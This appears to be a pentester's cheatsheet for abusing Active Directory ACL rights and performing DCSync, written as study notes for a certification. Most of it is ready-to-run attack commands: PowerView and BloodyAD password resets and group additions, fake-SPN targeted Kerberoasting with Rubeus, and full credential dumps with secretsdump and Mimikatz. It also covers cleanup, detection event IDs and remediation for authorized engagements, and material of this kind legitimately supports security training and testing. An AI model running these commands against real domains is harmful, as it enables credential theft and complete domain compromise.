# ACL Abuse & DCSync Cheatsheet

---

## 1. ACL Concepts (fast recap)

- **DACL** — who's allowed/denied access to an object (what attackers care about).
- **SACL** — audit logging only, not access control.
- **ACE** — one entry in an ACL: security principal + allow/deny + inheritance flags + access mask (32-bit rights value).
- Checked top-to-bottom, stops at first explicit deny.

### Abusable rights → tools
| Right | Abused with (PowerView) | What it gets you |
|---|---|---|
| `ForceChangePassword` | `Set-DomainUserPassword` | Reset a user's password without knowing the current one |
| `GenericWrite` | `Set-DomainObject` (user/computer) / `Add-DomainGroupMember` (group) | On a user: set a fake SPN → Kerberoast. On a group: add members. On a computer: RBCD (separate attack) |
| `GenericAll` | `Set-DomainUserPassword` / `Add-DomainGroupMember` | Full control — password reset, group membership, targeted Kerberoast, and if LAPS is in use, read the LAPS password |
| `WriteOwner` | `Set-DomainObjectOwner` | Take ownership of the object, then grant yourself further rights |
| `WriteDACL` | `Add-DomainObjectACL` | Write a brand-new ACE onto the object — e.g. grant yourself GenericAll |
| `AllExtendedRights` | `Set-DomainUserPassword` / `Add-DomainGroupMember` | Equivalent practical impact to GenericAll for most purposes |
| `AddSelf` | `Add-DomainGroupMember` | Add yourself to a group you have this specific right over |
| `ReadGMSAPassword` | `GMSAPasswordReader` (or `Get-ADServiceAccount`-based methods) | Read a gMSA's current password |

---

## 2. Enumeration — PowerView

**Don't dump everything blind.** `Find-InterestingDomainAcl` returns an unmanageable amount of noise in any real-size domain. Always enumerate **outward from a user/group you already control** instead.

**Get your controlled user's SID, then search for rights they hold:**
```powershell
Import-Module .\PowerView.ps1
$sid = Convert-NameToSid <controlled_user>
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```
> Note: older PowerView builds use `Get-ObjectAcl` instead of `Get-DomainObjectACL` — same purpose, different function name depending on fork/version. Check `Get-Command *ObjectAcl*`/`*ObjectACL*` if one doesn't exist on the host you're on.

**Always use `-ResolveGUIDs`.** Without it, `ObjectAceType` returns a raw GUID instead of a human-readable right name (e.g. `User-Force-Change-Password`), and you'll waste time reverse-looking-up GUIDs manually.

**Manual GUID → right name lookup (if you ever need it without ResolveGUIDs):**
```powershell
$guid = "<guid-here>"
Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * | Select Name,DisplayName,rightsGuid | ?{$_.rightsGuid -eq $guid} | fl
```

**No PowerView available — built-in `Get-Acl` fallback (slow, but works on a restricted host):**
```powershell
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
foreach($line in [System.IO.File]::ReadLines("ad_users.txt")) {
  Get-Acl "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'DOMAIN\\<controlled_user>'}
}
```
Know this exists for client-restricted engagements, but expect it to be much slower than PowerView on a large domain.

**Chaining the attack path manually:** once you find a right over object A, get A's SID and repeat the search against A — this is how you walk multi-hop paths (user → group GenericWrite → nested group → GenericAll on a privileged user → DCSync rights, etc.). Tedious by hand; this exact walk is what BloodHound automates.

**Linux equivalent to PowerView's ACL functions — `BloodyAD`** (actively maintained, pure-Python, no PowerShell needed):
```bash
bloodyAD --host <DC_IP> -d <domain> -u <user> -p '<pass>' get writable
bloodyAD --host <DC_IP> -d <domain> -u <user> -p '<pass>' set password <target_user> '<newpass>'
bloodyAD --host <DC_IP> -d <domain> -u <user> -p '<pass>' add groupMember <group> <member>
```
Covers password resets, group membership adds, GenericWrite SPN abuse, and more — worth knowing in addition to the older `pth-toolkit` (`pth-net`), which still works but is less actively developed.

---

## 3. Enumeration — BloodHound

Far faster than manual PowerView walking for anything beyond a one-hop check:
1. Set your controlled user as the starting node.
2. **Node Info → Outbound Control Rights** — shows direct control (First Degree Object Control) and everything reachable via chained rights (Transitive Object Control).
3. Right-click any edge (e.g. `ForceChangePassword`) → **Help** — gives the abuse command, OPSEC notes, and references for that specific edge, for both Windows and Linux tooling.
4. Pre-built query **Find Shortest Paths to Domain Admins** (or **to High Value Targets**) confirms the endpoint of a chain, e.g. a user with DCSync rights.

---

## 4. Example Attack Chain (methodology, generalized)

A real chain typically looks like: **cracked cred → ForceChangePassword on user B → GenericWrite on group G (via B) → nested group membership grants rights over user C → GenericAll on C → C has DCSync rights → full domain compromise.**

**Step pattern for each hop:**
```powershell
$SecPassword = ConvertTo-SecureString '<password>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\<controlled_user>', $SecPassword)

# ForceChangePassword hop
$newPw = ConvertTo-SecureString '<NewPass!23>' -AsPlainText -Force
Set-DomainUserPassword -Identity <target_user> -AccountPassword $newPw -Credential $Cred -Verbose

# GenericWrite hop — add yourself to a group
Add-DomainGroupMember -Identity '<group>' -Members '<controlled_user>' -Credential $Cred2 -Verbose

# GenericAll hop — targeted Kerberoast instead of a disruptive password reset
Set-DomainObject -Credential $Cred2 -Identity <target_user> -SET @{serviceprincipalname='fake/spn'} -Verbose
.\Rubeus.exe kerberoast /user:<target_user> /nowrap
```

**Prefer targeted Kerberoasting over a password reset when the target account can't be disrupted** (e.g. an admin's live account) — GenericAll/GenericWrite lets you add a temporary fake SPN, grab the ticket, crack offline, and the account owner never notices a thing (no forced logout, no password change).

**From Linux, the equivalent of the fake-SPN-and-kerberoast move is a single command** via `targetedKerberoast` — it sets the SPN, requests the ticket, and removes the SPN automatically:
```bash
targetedKerberoast.py -d <domain> -u <controlled_user> -p '<pass>'
```

---

## 5. Cleanup (order matters)

1. Remove the fake SPN first — **while you still hold the rights that let you remove it.**
   ```powershell
   Set-DomainObject -Credential $Cred2 -Identity <target_user> -Clear serviceprincipalname -Verbose
   ```
2. Remove yourself/your controlled account from any group you added membership to.
   ```powershell
   Remove-DomainGroupMember -Identity '<group>' -Members '<controlled_user>' -Credential $Cred2 -Verbose
   ```
3. Reset any password you force-changed back to original (if known) — or have the client reset it / notify the real user. **This one is destructive and should ideally be pre-approved with the client before you ever force-change a password.**

Document every modification in the report regardless of cleanup success — the client needs a full record to verify nothing was missed.

---

## 6. Detection & Remediation (for reporting)

- **Audit and remove dangerous ACLs** — regular BloodHound sweeps as part of routine AD hygiene, not just during pentests.
- **Monitor high-value group membership changes** in real time (Domain Admins, Enterprise Admins, any nested path leading to them).
- **Event ID 5136** — "A directory service object was modified" — fires on ACL/object changes. Decode the SDDL payload for human-readable detail:
  ```powershell
  ConvertFrom-SddlString "<SDDL string from event>" | Select -ExpandProperty DiscretionaryAcl
  ```
  Look for unexpected principals granted `GenericWrite`/`GenericAll`/`WriteDACL` on sensitive objects — that's the signature of an ACL being planted for persistence or escalation.
- **Event ID 4624/4738** for the password reset and group-membership-change side of an ACL attack chain, correlated with 5136, tightens detection further.

---

## 7. DCSync

### Concept
Abuses the legitimate **Directory Replication Service Remote Protocol** — the same mechanism DCs use to replicate data to each other — to pull the entire password database (NTLM hashes, Kerberos keys, and cleartext for reversible-encryption accounts) by impersonating a DC.

**Required rights:** `DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All` (and optionally `-In-Filtered-Set` for filtered attribute sets) on the domain object. Domain/Enterprise Admins have this by default — but **any account someone granted these rights to, intentionally or by accident, can perform a full DCSync.**

### Enumeration
```powershell
$sid = "<controlled_user_SID>"
Get-ObjectAcl "DC=domain,DC=local" -ResolveGUIDs | ? {($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} | select AceQualifier,ObjectDN,ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```
BloodHound shows this directly as a `GetChangesAll` / `DCSync` edge on a pre-built query — faster than the manual command above.

### Execution

**Impacket secretsdump.py — most common method, works remote from Linux:**
```bash
secretsdump.py -outputfile <output_prefix> -just-dc <domain>/<user>@<DC_IP>
```
Useful flags:
- `-just-dc-ntlm` — NTLM hashes only, skip Kerberos keys
- `-just-dc-user <username>` — single target user instead of the whole domain
- `-pwd-last-set` — shows last password change date per account (useful for password-age reporting)
- `-history` — dumps password history too (useful for cracking-stat reporting)
- `-user-status` — flags disabled accounts, so you can exclude them from cracking-rate metrics for the client report

Produces three files: `.ntds` (hashes), `.ntds.kerberos` (Kerberos keys), `.ntds.cleartext` (any accounts with reversible encryption enabled — rare, but worth checking every time).

**Enumerate reversible-encryption accounts ahead of time (so a cleartext hit isn't a surprise):**
```powershell
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
```

**Mimikatz — must run in the context of the privileged user. Use `runas /netonly` to spawn a session as them without needing to actually log in as them on that host:**
```cmd
runas /netonly /user:DOMAIN\<privileged_user> powershell
```
```
mimikatz # privilege::debug
mimikatz # lsadump::dcsync /domain:<domain> /user:DOMAIN\administrator
```

### Notes
- DCSync is a privilege-abuse technique, not a vulnerability — it only works because of a (mis)granted right. Chasing down **who else has this right besides built-in Admins** is a standard and high-value report finding on its own, even without a full domain compromise.
- Targeting `krbtgt` via DCSync is the first step toward a **Golden Ticket** for persistence — a separate, out-of-scope-here attack, but worth knowing the connection exists since DCSync is almost always the precursor.

### Detection
- **Event ID 4662** — "An operation was performed on an object" — specifically watch for the `DS-Replication-Get-Changes-All` GUID (`1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`) appearing against a non-DC, non-admin account. This is the single most specific DCSync detection signature and is worth calling out explicitly in a report alongside the more general 5136 ACL-change monitoring.
- Any account performing directory replication that isn't a registered Domain Controller computer object is inherently suspicious — this is the core detection logic most EDR/SIEM DCSync rules are built on.

---

## What's here that's easy to miss / extra for CPTS
- **`BloodyAD`** as the modern Linux-native alternative to `pth-toolkit` for ACL abuse — actively maintained, covers nearly everything PowerView does for ACL attacks without needing a Windows host.
- **`targetedKerberoast.py`** as the one-shot Linux equivalent of the manual fake-SPN-then-Rubeus Windows workflow.
- **Event ID 4662 with the specific replication GUID** as the precise DCSync detection signature — more actionable for a report than the general 5136 ACL-change event alone.
- Explicit reminder that `Get-ObjectAcl` vs `Get-DomainObjectACL` is a PowerView version/fork naming difference, not a different tool — don't get stuck if one doesn't exist on a given host's copy.
